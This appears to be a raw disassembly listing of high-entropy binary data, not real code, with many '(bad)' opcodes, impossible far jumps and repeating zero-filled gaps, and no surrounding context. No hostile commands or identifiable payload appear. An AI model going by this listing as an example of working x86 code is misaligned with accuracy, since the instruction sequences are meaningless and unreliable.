  420b78:	mov    edx,0xf999cf52
  420b7d:	out    dx,eax
  420b7e:	dec    BYTE PTR [ecx]
  420b80:	xor    esp,DWORD PTR [esi-0x61]
  420b83:	inc    edi
  420b84:	lds    esp,FWORD PTR [ebx+0xd]
  420b87:	clc    
  420b88:	addr16 call 0xfb413ac8
  420b8e:	inc    ecx
  420b8f:	dec    edx
  420b90:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420b91:	retf   0x93d1
  420b94:	jo     0x420be5
  420b96:	(bad)  [edi+eax*2]
  420b99:	pushf  
  420b9a:	jle    0x420b4f
  420b9c:	pop    esi
  420b9d:	xor    esp,0x5d
  420ba0:	out    0x82,al
  420ba2:	cmp    DWORD PTR [esi-0x80],ebx
  420ba5:	retf   
  420ba6:	adc    BYTE PTR [ecx+ebx*4],0xe3
  420baa:	mov    bl,0xe8
  420bac:	aaa    
  420bad:	pop    ds
  420bae:	rcr    DWORD PTR [eax-0x6173d378],1
  420bb4:	(bad)
  420bb7:	ret    
  420bb8:	jnp    0x420b49
  420bba:	xor    BYTE PTR [ebp-0x1662eb66],cl
  420bc0:	test   ecx,esi
  420bc2:	mov    eax,0x387d139c
  420bc7:	push   esp
  420bc8:	push   ebp
  420bc9:	sti    
  420bca:	cdq    
  420bcb:	rcl    ecx,1
  420bcd:	inc    bh
  420bcf:	fsubr  DWORD PTR [esi-0x70]
  420bd2:	cmp    ecx,edx
  420bd4:	pop    ecx
  420bd5:	retf   0x84e8
  420bd8:	xor    DWORD PTR [ecx+0x565ee4bc],ebp
  420bde:	pop    ebp
  420bdf:	sbb    BYTE PTR [ebp+0x6a],0xc7
  420be3:	pop    ecx
  420be4:	sub    eax,0xaf8f0556
  420be9:	mov    esp,0xcceb8a9d
  420bee:	in     eax,dx
  420bef:	xchg   BYTE PTR [edx-0x4e],ah
  420bf2:	(bad)  
  420bf3:	repnz fidiv DWORD PTR [edi-0x52]
  420bf7:	(bad)  
  420bf8:	cs aas 
  420bfa:	mov    al,0xdc
  420bfc:	mov    dh,0x48
  420bfe:	push   es
  420bff:	fild   WORD PTR [ecx+0x12]
  420c02:	jg     0x420c7b
  420c04:	mov    ebp,0xe8241b02
  420c09:	(bad)  
  420c0a:	sub    DWORD PTR [ebx-0x46],edx
  420c0d:	jb     0x420c13
  420c0f:	int3   
  420c10:	ins    DWORD PTR es:[edi],dx
  420c11:	fucomp st(5)
  420c13:	test   al,0x4
  420c15:	jg     0x420c16
  420c17:	shl    DWORD PTR [esi],cl
  420c19:	rcr    BYTE PTR [eax-0x527a9929],1
  420c1f:	xor    ebp,ecx
  420c21:	add    BYTE PTR [eax],0xe8
  420c24:	mov    dh,bl
  420c26:	mov    edi,0x84aedddd
  420c2b:	js     0x420c42
  420c2d:	test   BYTE PTR [ecx+0x79dce6e5],cl
  420c33:	popa   
  420c34:	(bad)  
  420c35:	out    dx,eax
  420c36:	ins    BYTE PTR es:[edi],dx
  420c37:	push   cs
  420c38:	inc    edi
  420c39:	not    esp
  420c3b:	cmp    esi,DWORD PTR [ecx-0x18750c51]
  420c41:	popf   
  420c42:	jle    0x420c75
  420c44:	pushf  
  420c45:	nop
  420c46:	test   BYTE PTR [esi+0x2e],dl
  420c49:	sub    bl,0xf3
  420c4c:	pop    ecx
  420c4d:	push   ds
  420c4e:	lea    edi,[edx-0x2f]
  420c51:	dec    ebp
  420c52:	jmp    0x38d16756
  420c57:	ja     0x420c15
  420c59:	cmp    DWORD PTR [eax],0xb4c286a7
  420c5f:	or     eax,0x2f363870
  420c64:	gs push ebp
  420c66:	sub    al,0x5c
  420c68:	and    BYTE PTR [edx-0x77],al
  420c6b:	mov    bl,0xf3
  420c6d:	out    0x0,eax
	...
  420cd3:	add    BYTE PTR [eax],al
  420cd5:	add    BYTE PTR [edx-0x604ef4eb],cl
  420cdb:	mov    edi,0x886e3fba
  420ce0:	add    ebp,esp
  420ce2:	in     al,dx
  420ce3:	mov    al,0xcb
  420ce5:	mov    esi,0x16067
  420cea:	add    BYTE PTR [ecx],al
  420cec:	add    BYTE PTR [eax],al
  420cee:	pop    esi
  420cef:	jmp    0x9aa81d81
  420cf4:	inc    ebp
  420cf5:	clc    
  420cf6:	add    al,0xd9
  420cf8:	inc    edx
  420cf9:	loop   0x420d09
  420cfb:	inc    edx
  420cfc:	push   edx
  420cfd:	nop
  420cfe:	stos   DWORD PTR es:[edi],eax
  420cff:	(bad)  
  420d00:	shl    ecx,1
  420d02:	xchg   BYTE PTR [esi+0x7a30b64c],al
  420d08:	hlt    
  420d09:	mov    dl,0xf7
  420d0b:	cmp    eax,0xc4b98d24
  420d10:	sar    BYTE PTR [eax-0x17],cl
  420d13:	push   edi
  420d14:	ss sbb ah,dh
  420d17:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420d18:	aaa    
  420d19:	dec    ecx
  420d1a:	fnsave [ebx-0x5d]
  420d1d:	cmp    DWORD PTR [esi+0x2dafbd7e],ecx
  420d23:	cmp    DWORD PTR [ebp+0x2dce514f],ebx
  420d29:	sbb    BYTE PTR [ebx+0x57],bl
  420d2c:	fist   DWORD PTR es:[edi-0x4c]
  420d30:	xor    DWORD PTR [ebx],ecx
  420d32:	shr    bl,0x3e
  420d35:	inc    edi
  420d36:	xlat   BYTE PTR ds:[ebx]
  420d37:	and    cl,BYTE PTR [edx]
  420d39:	mov    ebp,0x6068569c
  420d3e:	or     al,0xe9
  420d40:	dec    edx
  420d41:	pop    ebx
  420d42:	jp     0x420d0d
  420d44:	inc    ebp
  420d45:	xor    eax,esp
  420d47:	(bad)  [eax-0x13ae7036]
  420d4d:	mov    edi,DWORD PTR [ecx-0x55608e91]
  420d53:	leave  
  420d54:	push   es
  420d55:	cdq    
  420d56:	add    al,0xf6
  420d58:	cmp    ebx,DWORD PTR [eax]
  420d5a:	mov    esi,0x7faab307
  420d5f:	inc    edx
  420d60:	mov    al,ds:0x530cf166
  420d65:	call   0x1541ae0d
  420d6a:	mov    bl,0x17
  420d6c:	ja     0x420d34
  420d6e:	ins    BYTE PTR es:[edi],dx
  420d6f:	pop    ecx
  420d70:	push   ds
  420d71:	inc    esi
  420d72:	and    DWORD PTR [eax+0x42],0x41
  420d76:	mov    ebp,0xa0b89371
  420d7b:	jmp    0xdff1:0x6a1892db
  420d82:	push   cs
  420d83:	in     eax,0xef
  420d85:	je     0x420d93
  420d87:	and    dl,ch
  420d89:	jnp    0x420d38
  420d8b:	sbb    DWORD PTR [ebx+0x2d],0x90116242
  420d92:	push   esi
  420d93:	jnp    0x420d97
  420d95:	xor    al,0xdd
  420d97:	shl    esp,0xa4
  420d9a:	push   edx
  420d9b:	push   es
  420d9c:	mov    bh,0xa2
  420d9e:	jae    0x420d7c
  420da0:	inc    ebx
  420da1:	or     eax,0xfbaad219
  420da6:	sbb    ch,BYTE PTR [esp+ebp*4]
  420da9:	out    0x2d,al
  420dab:	dec    DWORD PTR [eax]
  420dad:	jnp    0x420e2a
  420daf:	loop   0x420dbe
  420db1:	and    dl,BYTE PTR [edx+0x9]
  420db4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420db5:	mov    ds:0x719a1522,al
  420dba:	jg     0x420dbd
  420dbc:	data16 fld DWORD PTR [esi-0x3f]
  420dc0:	loopne 0x420e10
  420dc2:	into   
  420dc3:	xchg   ebx,eax
  420dc4:	loope  0x420d8b
  420dc6:	lahf   
  420dc7:	xor    BYTE PTR [ecx-0x2c],ch
  420dca:	outs   dx,BYTE PTR ds:[esi]
  420dcb:	sub    cl,BYTE PTR [edx-0x3e]
  420dce:	xor    ah,BYTE PTR [edi]
  420dd0:	sbb    cl,BYTE PTR [ecx]
  420dd2:	mov    DWORD PTR [bx+si],eax
  420dd5:	adc    eax,0x886cd383
  420dda:	or     eax,0xbd89c417
  420ddf:	xor    ah,BYTE PTR [ecx+0x3aba977f]
  420de5:	sti    
  420de6:	loop   0x420df8
  420de8:	nop
  420de9:	or     ch,BYTE PTR [eax]
  420deb:	jno    0x420e06
  420ded:	cmp    DWORD PTR [eax],eax
	...
  420e53:	add    BYTE PTR [eax],al
  420e55:	add    bh,ah
  420e57:	push   ds
  420e58:	into   
  420e59:	push   0x9fe7f8ff
  420e5e:	push   esi
  420e5f:	inc    edi
  420e60:	lahf   
  420e61:	mov    al,ds:0x29eb8292
  420e66:	addr16 popa 
  420e68:	add    DWORD PTR [eax],eax
  420e6a:	add    BYTE PTR [ecx],al
  420e6c:	add    BYTE PTR [eax],al
  420e6e:	out    dx,eax
  420e6f:	xchg   BYTE PTR [edi-0x33],ah
  420e72:	dec    edx
  420e73:	mov    esp,0xaa01624f
  420e78:	in     al,dx
  420e79:	push   ebp
  420e7a:	jmp    FWORD PTR [edi]
  420e7c:	mov    ds:0xd0583854,eax
  420e81:	mov    ch,0x8e
  420e83:	(bad)  
  420e84:	test   BYTE PTR [ebx],0xde
  420e87:	pop    ebx
  420e88:	and    al,0x1f
  420e8a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420e8b:	jns    0x420e48
  420e8d:	in     eax,dx
  420e8e:	mov    eax,ds:0x4769c45
  420e93:	sub    ebx,esi
  420e95:	inc    ecx
  420e96:	jmp    0x60c5c109
  420e9b:	cmp    cl,BYTE PTR [ebp+0x7a6f7734]
  420ea1:	loop   0x420e53
  420ea3:	cmp    al,0x14
  420ea5:	and    bh,BYTE PTR [eax-0x48319f70]
  420eab:	out    0xd9,al
  420ead:	dec    ecx
  420eae:	es aam 0x6b
  420eb1:	pushf  
  420eb2:	repnz cs repnz leave 
  420eb6:	out    0x72,eax
  420eb8:	ds (bad) 
  420eba:	mov    al,ds:0x7a91cf09
  420ebf:	in     eax,dx
  420ec0:	dec    ebp
  420ec1:	or     ch,bh
  420ec3:	sub    al,0x39
  420ec5:	push   edx
  420ec6:	mov    WORD PTR [ebx],gs
  420ec8:	mov    ebp,0x1e915feb
  420ecd:	dec    ecx
  420ece:	out    0xc1,al
  420ed0:	dec    edx
  420ed1:	shl    DWORD PTR [edx-0x75ff2acd],cl
  420ed7:	int3   
  420ed8:	or     al,0xf6
  420eda:	(bad)  
  420edb:	mov    eax,0xaa93e38
  420ee0:	out    dx,al
  420ee1:	scas   al,BYTE PTR es:[edi]
  420ee2:	jo     0x420eb2
  420ee4:	mov    ds:0x5c5c23f,eax
  420ee9:	iret   
  420eea:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420eeb:	fcomi  st,st(3)
  420eed:	dec    edx
  420eee:	test   BYTE PTR [edi+ebx*2-0x53],bl
  420ef2:	sbb    al,0x71
  420ef4:	xor    DWORD PTR [edx-0xa7cfa6c],esi
  420efa:	shr    dh,1
  420efc:	aas    
  420efd:	or     DWORD PTR [edi-0x48ff8b65],eax
  420f03:	or     ch,ch
  420f05:	loope  0x420ef4
  420f07:	(bad)  
  420f08:	mov    esp,0xa6de8362
  420f0d:	(bad)  
  420f0e:	cmp    ecx,DWORD PTR [edx+0x4c021ea8]
  420f14:	and    eax,0x6082b168
  420f19:	or     cl,dl
  420f1b:	ret    0x6c39
  420f1e:	or     edi,DWORD PTR [eax+0x61]
  420f21:	or     edi,DWORD PTR [edx+0xa72d2c3]
  420f27:	fmul   st,st(1)
  420f29:	lds    esp,FWORD PTR [edx+0x2c82ed70]
  420f2f:	inc    eax
  420f30:	mov    ecx,esi
  420f32:	push   ecx
  420f33:	lock cld 
  420f35:	daa    
  420f36:	jns    0x420f9d
  420f38:	mov    DWORD PTR [eax],eax
  420f3a:	jb     0x420f4f
  420f3c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420f3d:	mov    ch,0xef
  420f3f:	bnd jge 0x420edb
  420f42:	add    eax,0xc3cde922
  420f47:	ja     0x420f26
  420f49:	aas    
  420f4a:	fisttp DWORD PTR [eax-0x71b786a8]
  420f50:	mov    cl,0x59
  420f52:	mov    ebx,0x7a5010f1
  420f57:	sub    dl,BYTE PTR [edi]
  420f59:	(bad)  
  420f5a:	out    dx,eax
  420f5b:	mov    ecx,0x9337d77b
  420f60:	iret   
  420f61:	ins    BYTE PTR es:[edi],dx
  420f62:	or     al,0xa7
  420f64:	test   DWORD PTR [edx],esi
  420f66:	loopne 0x420f8b
  420f68:	js     0x420f2e
  420f6a:	xor    BYTE PTR [edi],bh
  420f6c:	add    DWORD PTR [edi+0x0],ecx
	...
  420fd6:	and    BYTE PTR [edi-0x28082cbe],dl
  420fdc:	mov    cl,0xf7
  420fde:	jg     0x420fcd
  420fe0:	or     esp,DWORD PTR [esi-0x165c87aa]
  420fe6:	bound  eax,QWORD PTR [bx+di]
  420fe9:	add    BYTE PTR [eax],al
  420feb:	add    DWORD PTR [eax],eax
  420fed:	add    al,ah
  420fef:	inc    ecx
  420ff0:	call   0x96e4:0x970e0796
  420ff7:	mov    esp,0xf709c014
  420ffc:	inc    ebx
  420ffd:	aas    
  420ffe:	jmp    0x42100c
  421000:	add    eax,0xbeb8b8ff
  421005:	aaa    
  421006:	shr    BYTE PTR [ebp+0x51bbd16],0x6
  42100d:	xor    al,0xe8
  42100f:	jnp    0x421045
  421011:	cld    
  421012:	add    eax,0x5b924917
  421017:	inc    ebp
  421018:	pop    ebp
  421019:	and    ebx,DWORD PTR [esi+0xd]
  42101c:	and    al,0x80
  42101e:	cmp    DWORD PTR [edx],ecx
  421020:	dec    edi
  421021:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421022:	hlt    
  421023:	pop    ss
  421024:	sbb    bh,BYTE PTR es:[ecx+eax*2+0x28]
  421029:	retf   
  42102a:	adc    ebx,DWORD PTR ds:0x84aef198
  421030:	inc    ebp
  421031:	pop    edx
  421032:	nop
  421033:	sbb    esi,DWORD PTR [ecx+0x4fea4b4b]
  421039:	cmp    DWORD PTR [esi+0x7ddc7eff],esp
  42103f:	int    0x69
  421041:	or     al,0xe1
  421043:	cmp    BYTE PTR [ebp-0x1daf1617],dl
  421049:	mov    ebx,0x73018904
  42104e:	mov    ebp,0x711692dc
  421053:	xchg   ebx,eax
  421054:	inc    esp
  421055:	xchg   DWORD PTR [ebx],ecx
  421057:	icebp  
  421058:	imul   edx,DWORD PTR [ebx+0x6c3ca45f],0x3879af2
  421062:	xchg   esi,eax
  421063:	sbb    eax,0x79857489
  421068:	ins    BYTE PTR es:[edi],dx
  421069:	imul   edx,edi,0x28b9127e
  42106f:	sub    eax,0x7ca8f8fc
  421074:	inc    esp
  421075:	mov    WORD PTR [esi+0x7dbe1567],es
  42107b:	mov    ebx,0x11418a64
  421080:	pop    es
  421081:	mov    ds:0x58d7be68,eax
  421086:	xor    BYTE PTR [ebp+0x1256cb45],ah
  42108c:	sub    eax,0x73748926
  421091:	out    dx,eax
  421092:	push   eax
  421093:	div    DWORD PTR [edi]
  421095:	mov    al,ds:0xf29756f4
  42109a:	inc    esi
  42109b:	sti    
  42109c:	scas   eax,DWORD PTR es:[edi]
  42109d:	sub    ecx,esp
  42109f:	jecxz  0x42108f
  4210a1:	push   ds
  4210a2:	push   0x62a90390
  4210a7:	inc    ecx
  4210a8:	bound  edi,QWORD PTR [ebx-0x6d]
  4210ab:	xchg   DWORD PTR [esi],ecx
  4210ad:	pop    ds
  4210ae:	push   edx
  4210af:	dec    esi
  4210b0:	rcl    BYTE PTR [esi*1+0x7d696658],cl
  4210b7:	test   eax,0x4142ce68
  4210bc:	imul   esi,DWORD PTR [edx+0x360acc8],0xb4ce0def
  4210c6:	or     BYTE PTR [edi],bl
  4210c8:	cmp    eax,0xba7d4a1e
  4210cd:	ins    BYTE PTR es:[edi],dx
  4210ce:	dec    ebx
  4210cf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4210d0:	and    al,0x26
  4210d2:	les    esi,FWORD PTR [ebx]
  4210d4:	icebp  
  4210d5:	stc    
  4210d6:	and    DWORD PTR [eax+edx*1],0x48c9e35c
  4210dd:	jge    0x4210b5
  4210df:	sti    
  4210e0:	cdq    
  4210e1:	pop    ebp
  4210e2:	mov    fs,WORD PTR [esi]
  4210e4:	lahf   
  4210e5:	sbb    eax,0xe909e4a0
  4210ea:	dec    ebx
  4210eb:	mov    dl,0x88
  4210ed:	or     BYTE PTR [eax],al
	...
  421153:	add    BYTE PTR [eax],al
  421155:	add    BYTE PTR [edi-0x243925a2],bl
  42115b:	(bad)  
  42115c:	lahf   
  42115d:	pop    edi
  42115e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42115f:	jne    0x421143
  421161:	mov    fs,WORD PTR [ebx-0x77]
  421164:	ret    0x6719
  421167:	arpl   WORD PTR [ecx],ax
  421169:	add    BYTE PTR [eax],al
  42116b:	add    DWORD PTR [eax],eax
  42116d:	add    ah,ch
  42116f:	aas    
  421170:	jns    0x421125
  421172:	lods   al,BYTE PTR ds:[esi]
  421173:	iret   
  421174:	test   al,dl
  421176:	mov    ah,0x94
  421178:	inc    ebx
  421179:	mov    bh,0x77
  42117b:	add    ebx,DWORD PTR [ebx]
  42117d:	(bad)  
  42117e:	mov    DWORD PTR [edx+0x66],esp
  421181:	je     0x421142
  421183:	fisub  WORD PTR [ebx+esi*2]
  421186:	push   esi
  421187:	dec    ebp
  421188:	fisubr WORD PTR [ecx+0x1e597f2c]
  42118e:	mov    bl,BYTE PTR [edi-0x5]
  421191:	mov    ecx,DWORD PTR [ebx]
  421193:	and    eax,0xc69dc010
  421198:	cmc    
  421199:	xor    dh,al
  42119b:	enter  0xe994,0x4e
  42119f:	cmp    BYTE PTR [eax-0x80],ch
  4211a2:	xor    BYTE PTR [esp+eiz*8+0x6933ea85],bh
  4211a9:	add    eax,DWORD PTR [esi-0x70]
  4211ac:	dec    esp
  4211ad:	fisttp QWORD PTR es:[edi-0x7c389ee8]
  4211b4:	sub    DWORD PTR [eax],edi
  4211b6:	sbb    eax,0xa4859eea
  4211bb:	inc    eax
  4211bc:	sub    bh,dh
  4211be:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4211bf:	push   ebp
  4211c0:	loopne 0x421189
  4211c2:	leave  
  4211c3:	jno    0x4211aa
  4211c5:	mov    esi,0xa4c1df8
  4211ca:	nop
  4211cb:	(bad)  
  4211cc:	cmp    ch,BYTE PTR [edi]
  4211ce:	fbstp  TBYTE PTR [ebp-0x37]
  4211d1:	mov    ds:0x186b4ea,al
  4211d6:	sbb    eax,0xf78b1499
  4211db:	sbb    eax,0xfd3720b5
  4211e0:	xor    esp,esp
  4211e2:	lea    ebp,ss:[eax+0x19]
  4211e6:	into   
  4211e7:	jae    0x421205
  4211e9:	push   edx
  4211ea:	pop    edx
  4211eb:	inc    eax
  4211ec:	bound  ebx,QWORD PTR [ebx+0x6e98c25c]
  4211f2:	xor    eax,0x37cf9c00
  4211f7:	loop   0x421237
  4211f9:	dec    ebp
  4211fa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4211fb:	daa    
  4211fc:	xchg   ebx,eax
  4211fd:	in     al,dx
  4211fe:	inc    ebx
  4211ff:	add    DWORD PTR [edx+0x45355314],esp
  421205:	add    bl,BYTE PTR [ecx-0x38]
  421208:	imul   eax,DWORD PTR [ebx+0x4e],0x18
  42120c:	jg     0x4211e9
  42120e:	in     eax,0xe0
  421210:	or     dl,bh
  421212:	jmp    0x7d9e6e2a
  421217:	ins    DWORD PTR es:[edi],dx
  421218:	mov    dh,0x38
  42121a:	add    esp,DWORD PTR [esi]
  42121c:	(bad)  
  42121d:	sub    al,0xa5
  42121f:	xor    BYTE PTR [esi+0x6],ah
  421222:	cmp    DWORD PTR [edx+0x2d],edi
  421225:	and    al,0x4f
  421227:	pusha  
  421228:	pop    eax
  421229:	js     0x42123d
  42122b:	loopne 0x4211f7
  42122d:	dec    edx
  42122e:	jecxz  0x42128d
  421230:	cs jp  0x4211d3
  421233:	sbb    dh,al
  421235:	outs   dx,DWORD PTR ds:[esi]
  421236:	repnz sahf 
  421238:	mov    ch,0xb
  42123a:	loope  0x4212b0
  42123c:	out    0x6c,al
  42123e:	push   ebp
  42123f:	mov    ch,0x7
  421241:	and    bl,BYTE PTR [eax-0x42d3d7a]
  421247:	loopne 0x42129b
  421249:	adc    DWORD PTR [eax-0x3b],esi
  42124c:	mov    ?,WORD PTR [ecx]
  42124e:	push   cs
  42124f:	dec    eax
  421250:	mov    edx,0xb4a225e7
  421255:	inc    esi
  421256:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421257:	call   0x540c:0xb28cecb4
  42125e:	hlt    
  42125f:	push   edx
  421260:	aas    
  421261:	iret   
  421262:	fwait
  421263:	mov    edi,0x80ffc526
  421268:	pusha  
  421269:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42126a:	adc    eax,0xe76aa4
	...
  4212d3:	add    BYTE PTR [eax],al
  4212d5:	add    BYTE PTR [esi-0x700870e1],bl
  4212db:	idiv   esi
  4212dd:	jg     0x42129c
  4212df:	sub    eax,0x571e7ab3
  4212e4:	or     BYTE PTR [edi],ah
  4212e6:	add    DWORD PTR fs:[bx+si],eax
  4212ea:	add    BYTE PTR [ecx],al
  4212ec:	add    BYTE PTR [eax],al
  4212ee:	jg     0x421307
  4212f0:	dec    ebx
  4212f1:	inc    ebp
  4212f2:	pop    ds
  4212f3:	mov    cs,WORD PTR [ebx-0x25]
  4212f6:	jecxz  0x42130e
  4212f8:	bound  edi,QWORD PTR [ecx+eax*1+0x1cab25d9]
  4212ff:	sub    edx,edi
  421301:	cmp    ah,cl
  421303:	xchg   esp,eax
  421304:	mov    al,0xc4
  421306:	scas   al,BYTE PTR es:[edi]
  421307:	pop    es
  421308:	(bad)  
  421309:	rcr    BYTE PTR [eax-0xd],cl
  42130c:	xchg   BYTE PTR ds:0x45a5d242,ah
  421312:	sub    eax,0x9877dc3e
  421317:	std    
  421318:	mov    ds,WORD PTR [edi-0x1261f247]
  42131e:	cli    
  42131f:	xlat   BYTE PTR ds:[ebx]
  421321:	and    dh,bh
  421323:	pop    ss
  421324:	jecxz  0x42135b
  421326:	nop
  421327:	and    edi,DWORD PTR [ecx-0x6e71b390]
  42132d:	clc    
  42132e:	cmp    dl,BYTE PTR [eax-0x62]
  421331:	cli    
  421332:	push   ebp
  421333:	add    BYTE PTR [edx+0xe25ddbf],bh
  421339:	push   0xffffffed
  42133b:	aas    
  42133c:	lods   al,BYTE PTR ds:[esi]
  42133d:	dec    ebp
  42133e:	fwait
  42133f:	pop    ebp
  421340:	nop/reserved BYTE PTR [ebp-0x60]
  421344:	pop    eax
  421345:	loopne 0x421342
  421347:	inc    eax
  421348:	(bad)  
  421349:	or     esi,DWORD PTR ss:[ebx]
  42134c:	sub    bl,BYTE PTR [ebx]
  42134e:	jno    0x42132a
  421350:	add    BYTE PTR [edi-0x53e85f0],dh
  421356:	xor    BYTE PTR [ebp+0x30],dh
  421359:	lahf   
  42135a:	jne    0x421370
  42135c:	lea    ecx,[esi+0x64]
  42135f:	shr    DWORD PTR [ebp+0x4d3dee37],cl
  421365:	aas    
  421366:	popa   
  421367:	ret    
  421368:	(bad)  
  421369:	in     eax,0xaf
  42136b:	cmp    al,0xb8
  42136d:	jl     0x4213bd
  42136f:	mov    ah,0xfd
  421371:	das    
  421372:	adc    DWORD PTR [ebp-0x55b0a999],esp
  421378:	iret   
  421379:	pop    ds
  42137a:	and    ch,bl
  42137c:	and    esi,DWORD PTR [ebx+0x7]
  42137f:	inc    edx
  421380:	or     DWORD PTR [ebp-0xd],edi
  421383:	shl    DWORD PTR [edi-0x6ca0bd56],1
  421389:	push   esp
  42138a:	adc    bh,ch
  42138c:	xchg   BYTE PTR [edi],al
  42138e:	imul   esp,DWORD PTR [edx-0x1c52f45e],0xffffffb6
  421395:	popa   
  421396:	xlat   BYTE PTR ds:[ebx]
  421397:	adc    DWORD PTR [ebx],0xb0bb0473
  42139d:	jg     0x4213e3
  42139f:	fdiv   DWORD PTR [eax]
  4213a1:	mov    al,0xa8
  4213a3:	mov    al,ds:0x5dd41243
  4213a8:	test   BYTE PTR [ecx+0x4e],bl
  4213ab:	scas   eax,DWORD PTR es:[edi]
  4213ac:	je     0x4213c6
  4213ae:	or     eax,0x4ecd91c0
  4213b3:	ins    DWORD PTR es:[edi],dx
  4213b4:	sub    BYTE PTR [esi+0x45],0xa2
  4213b8:	cwde   
  4213b9:	std    
  4213ba:	mov    eax,0x181c651a
  4213bf:	cmp    BYTE PTR [ebp-0x6b57a19],cl
  4213c5:	pop    esp
  4213c6:	not    BYTE PTR [ecx+0x22]
  4213c9:	and    ecx,edx
  4213cb:	mov    eax,ds:0x356f745
  4213d0:	or     eax,0x58f50e80
  4213d5:	cmp    DWORD PTR [ebp+ecx*1+0x33],esp
  4213d9:	mov    eax,ds:0xc2154940
  4213de:	call   0x4fdf:0x1c8959e4
  4213e5:	jne    0x42138d
  4213e7:	pop    eax
  4213e8:	fsubr  QWORD PTR [ebx+0x126ef1]
	...
  421456:	inc    bh
  421458:	pop    esp
  421459:	mov    eax,ds:0xdfffbb7d
  42145e:	fstp   DWORD PTR [ebp+0x115af49f]
  421464:	cld    
  421465:	xchg   DWORD PTR [edi+0x65],esp
  421468:	add    DWORD PTR [eax],eax
  42146a:	add    BYTE PTR [ecx],al
  42146c:	add    BYTE PTR [eax],al
  42146e:	enter  0x54e2,0x37
  421472:	jle    0x4214b2
  421474:	adc    bh,dh
  421476:	mov    dh,0x7d
  421478:	(bad)  
  421479:	ins    DWORD PTR es:[edi],dx
  42147a:	lock cmp BYTE PTR [esi-0x12f519db],ah
  421481:	rcl    DWORD PTR ds:0xa895a8ca,0x44
  421488:	in     eax,0x1c
  42148a:	fs retf 
  42148c:	pushf  
  42148d:	icebp  
  42148e:	(bad)  
  42148f:	sbb    ebx,DWORD PTR [edx+0x14e7096f]
  421495:	inc    edx
  421496:	mov    esi,eax
  421498:	inc    ebp
  421499:	pop    esp
  42149a:	idiv   DWORD PTR [ebp+0xa035fb0]
  4214a0:	scas   al,BYTE PTR es:[edi]
  4214a1:	mov    al,ds:0x7cd7f970
  4214a6:	outs   dx,DWORD PTR ds:[esi]
  4214a7:	cs loop 0x421493
  4214aa:	and    ecx,edi
  4214ac:	mov    bh,0x9b
  4214ae:	scas   eax,DWORD PTR es:[edi]
  4214af:	enter  0x49d2,0x4
  4214b3:	fsub   DWORD PTR [esi]
  4214b5:	sbb    al,dh
  4214b7:	loope  0x421452
  4214b9:	xchg   esp,eax
  4214ba:	test   eax,0xd7c7ed42
  4214bf:	mov    dl,0x95
  4214c1:	xor    DWORD PTR [ebp+0x45dafabb],ecx
  4214c7:	in     al,0xcc
  4214c9:	ins    DWORD PTR es:[edi],dx
  4214ca:	jmp    0x69d7:0x4d3aa234
  4214d1:	(bad)  
  4214d2:	dec    ebp
  4214d3:	sbb    BYTE PTR [esi],al
  4214d5:	and    bh,bh
  4214d7:	push   0xffffff80
  4214d9:	jnp    0x42151a
  4214db:	and    al,0x2f
  4214dd:	pop    ebx
  4214de:	xchg   esp,eax
  4214df:	pop    esi
  4214e0:	js     0x421482
  4214e2:	(bad)  
  4214e3:	fisubr DWORD PTR [eax-0x6bd75321]
  4214e9:	ja     0x42149c
  4214eb:	mov    ds:0xb03bbe48,al
  4214f1:	pop    ss
  4214f2:	push   edi
  4214f3:	dec    edi
  4214f4:	sub    al,0xf6
  4214f6:	xchg   DWORD PTR [ecx],ecx
  4214f8:	xor    bl,BYTE PTR [ebx+0x70540177]
  4214fe:	(bad)  
  4214ff:	pop    ebx
  421500:	aad    0x20
  421502:	push   edi
  421503:	cmp    bl,BYTE PTR [ebp-0x2717ab31]
  421509:	(bad)  
  42150a:	adc    eax,0x462cb287
  42150f:	hlt    
  421510:	pop    edi
  421511:	and    bh,BYTE PTR [edi-0x60]
  421514:	test   al,0x30
  421516:	das    
  421517:	ins    BYTE PTR es:[edi],dx
  421518:	test   ebx,eax
  42151a:	dec    esi
  42151b:	in     al,0x46
  42151d:	gs aam 0xe7
  421520:	pop    es
  421521:	adc    DWORD PTR [edx-0x4a4ce710],edx
  421527:	stos   DWORD PTR es:[edi],eax
  421528:	popa   
  421529:	int3   
  42152a:	enter  0x51df,0x9a
  42152e:	and    DWORD PTR [edi+0x98d8ef3],esi
  421534:	push   eax
  421535:	sbb    BYTE PTR [edi],0x61
  421538:	xchg   BYTE PTR [ebx],dl
  42153a:	mov    es,WORD PTR [eax-0x3d]
  42153d:	stc    
  42153e:	lea    esp,[edx]
  421540:	sub    DWORD PTR [esi],eax
  421542:	in     al,0x82
  421544:	mov    BYTE PTR [edx],dh
  421546:	loope  0x421577
  421548:	sbb    edi,edx
  42154a:	pop    edi
  42154b:	mov    bh,0xa8
  42154d:	sbb    al,0x55
  42154f:	in     al,0x92
  421551:	loop   0x421577
  421553:	pop    ebp
  421554:	add    eax,0x26025349
  421559:	xor    BYTE PTR [eax+0x61dfb182],ch
  42155f:	xlat   BYTE PTR ds:[ebx]
  421560:	or     BYTE PTR [ecx+esi*1+0x4b],bl
  421564:	jo     0x42153e
  421566:	pusha  
  421567:	enter  0xb71e,0x7a
  42156b:	and    edx,DWORD PTR [edx]
  42156d:	adc    BYTE PTR [eax],al
	...
  4215d3:	add    BYTE PTR [eax],al
  4215d5:	add    dh,dl
  4215d7:	repnz test BYTE PTR [eax],bl
  4215da:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4215db:	jle    0x4215bb
  4215dd:	(bad)  
  4215de:	arpl   WORD PTR [eax+0x17f742b4],bp
  4215e4:	or     edx,DWORD PTR [ebx+0x67]
  4215e7:	add    WORD PTR [eax],ax
  4215ea:	add    BYTE PTR [ecx],al
  4215ec:	add    BYTE PTR [eax],al
  4215ee:	scas   al,BYTE PTR es:[edi]
  4215ef:	cmp    edi,0x9165698d
